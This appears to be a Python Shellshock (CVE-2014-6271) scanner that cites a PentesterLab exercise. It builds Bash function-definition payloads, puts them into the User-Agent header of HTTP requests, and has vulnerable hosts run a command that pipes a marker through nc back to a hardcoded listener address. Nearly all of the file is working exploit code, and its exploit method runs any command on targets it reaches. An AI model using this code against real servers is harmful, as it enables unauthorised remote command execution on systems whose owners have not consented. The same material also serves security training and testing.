#Reference: https://pentesterlab.com/exercises/cve-2014-6271/course
import requests
import time
import sockets
from thread_decorator import run_as_thread

EXPLOIT1='() { :;};%s'
EXPLOIT2='() { _; } >_[$($())] { %s; }'

TIMEOUT=3
TEST_MSG = "V"
RECV_SIZE = 10

HOST_IP = "192.168.1.89"
HOST_PORT = 9992

class shellshock_listener():
    def __init__(self, HOST_IP, HOST_PORT, verbose):
        self.ip = HOST_IP
        self.port = HOST_PORT
        self.data_sock = sockets.LocalSocket()
        self.data_sock.bind(self.ip, self.port)
        self.vuln_list = []
        self.vuln_index = 0
        self.expected = {}
        self.recv_threads = []
        self.verbose = verbose

    def clear(self):
        self.vuln_list = []
        #print("Num threads waiting: ", len(self.recv_threads))

    @run_as_thread
    def recv(self, URL):
        if self.verbose:
            print("Listening...")
        self.data_sock.accept()


        msg = self.data_sock.recv(RECV_SIZE).decode("ascii")
        if self.expected[msg]:
          if self.verbose: 
            print("Vulnerable:", self.expected[msg])
          self.vuln_list.append(self.expected[msg])
        

    def exploit(self, URL, command, timeout=None):
        shellcode=EXPLOIT1 % command

        headers = {"User-Agent": shellcode}
        start = time.time()
        try:
            res = requests.get(URL, headers=headers, timeout=timeout)
        except:
            #print("Timed out")
            pass


    def shellshock_test(self, URL):
        msg = TEST_MSG + str(self.vuln_index)
        #add padding
        while len(msg) < RECV_SIZE:
            msg = msg + " "

        self.expected[msg] = URL
        self.recv_threads.append(self.recv(URL))
        if self.verbose:
            print("Sending shellshock exploit to: ", URL)
        self.vuln_index += 1
        self.exploit(URL, 'echo "'+str(msg)+'" | /usr/bin/nc ' + self.ip + ' ' + str(self.port), TIMEOUT)